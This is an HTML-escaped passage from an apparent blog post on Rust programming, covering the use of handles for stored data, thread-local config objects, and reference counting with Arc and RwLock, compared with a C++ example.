&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;unsafe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from_raw_parts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In this case &lt;cite&gt;Data&amp;lt;'a&amp;gt;&lt;/cite&gt; only holds a copy-on-write reference to the backing byte storage (an owned &lt;cite&gt;Vec&amp;lt;u8&amp;gt;&lt;/cite&gt; or a borrowed &lt;cite&gt;&amp;amp;[u8]&lt;/cite&gt; slice). The byte slice starts with the bytes from &lt;cite&gt;Header&lt;/cite&gt; and they are resolved on demand when &lt;cite&gt;header()&lt;/cite&gt; is called. Likewise a single slice is resolved similarly by the call to &lt;cite&gt;load_slice()&lt;/cite&gt; which takes a stored slice and then looks it up by offsetting on demand.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;To recap: instead of storing a pointer to an object itself, store some information so that you can calculate the pointer later. This is also commonly called using “handles”.&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;refcounts-are-not-dirty&quot; readability=&quot;59.5&quot;&gt;
&lt;h2&gt;Refcounts are not Dirty&lt;/h2&gt;
&lt;p&gt;Another quite interesting case that is surprisingly easy to run into also has to do with the borrow checker. The borrow checker doesn't let you do stupid things with data you do not own and sometimes that can feel like running into a wall because you think you know better. In many of those cases the answer is just one &lt;cite&gt;Rc&amp;lt;T&amp;gt;&lt;/cite&gt; away however.&lt;/p&gt;
&lt;p&gt;To make this less mysterious let's look at the following piece of C++ code:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;thread_local&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;current_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// do something&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This seems pretty innocent but it has a problem: nothing stops you from borrowing a field from &lt;cite&gt;current_config&lt;/cite&gt; and then passing it somewhere else. This is why in Rust the direct equivalent of that looks significantly more complicated:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;cp&quot;&gt;#[derive(Default)]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;thread_local&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// here we can *immutably* work with config&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// do something&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This should make it immediately obvious that this API is not fun. First of all the config is immutable. Secondly we can only access the config object within the closure passed to the &lt;cite&gt;with&lt;/cite&gt; function. Any attempt of trying to borrow from this config object and have it outlive the closure will fail (probably with something like “cannot infer an appropriate lifetime”). There is no way around it!&lt;/p&gt;
&lt;p&gt;This API is clearly objectively bad. Imagine we want to look up more of those thread local variables. So let's look at both of those issues separately. As hinted above ref counting is generally a really nice solution to deal with the underlying issue here: it's unclear who the owner is.&lt;/p&gt;
&lt;p&gt;Let's imagine for a second this config object just happens to be bound to the current thread but is not really owned by the current thread. What happens if the config is passed to another thread but the current thread shuts down? This is a typical example where one can think of logically the config having multiple owners. Since we might want to pass from one thread to another we want an atomically reference counted wrapper for our config: an &lt;cite&gt;Arc&amp;lt;Config&amp;gt;&lt;/cite&gt;. This lets us increase the refcount in the with block and return it. The refactored version looks like this:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#[derive(Default)]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;impl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;thread_local&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// here we can *immutably* work with config&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// do something&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The change here is that now the thread local holds a reference counted config. As such we can introduce a function that returns an &lt;cite&gt;Arc&amp;lt;Config&amp;gt;&lt;/cite&gt;. In the closure from the TLS we increment the refcount with the &lt;cite&gt;clone()&lt;/cite&gt; method on the &lt;cite&gt;Arc&amp;lt;Config&amp;gt;&lt;/cite&gt; and return it. Now any caller to &lt;cite&gt;Config::current&lt;/cite&gt; gets that refcounted config and can hold on to it for as long as necessary. For as long as there is code holding the Arc, the config within it is kept alive. Even if the originating thread died.&lt;/p&gt;
&lt;p&gt;So how do we make it mutable like in the C++ version? We need something that provides us with interior mutability. There are two options for this. One is to wrap the &lt;cite&gt;Config&lt;/cite&gt; in something like an &lt;cite&gt;RwLock&lt;/cite&gt;. The second one is to have the &lt;cite&gt;Config&lt;/cite&gt; use locking internally. For instance one &lt;em&gt;might&lt;/em&gt; want to do this:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RwLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#[derive(Default)]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConfigInner&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RwLock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConfigInner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;impl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RwLock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_CONFIG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
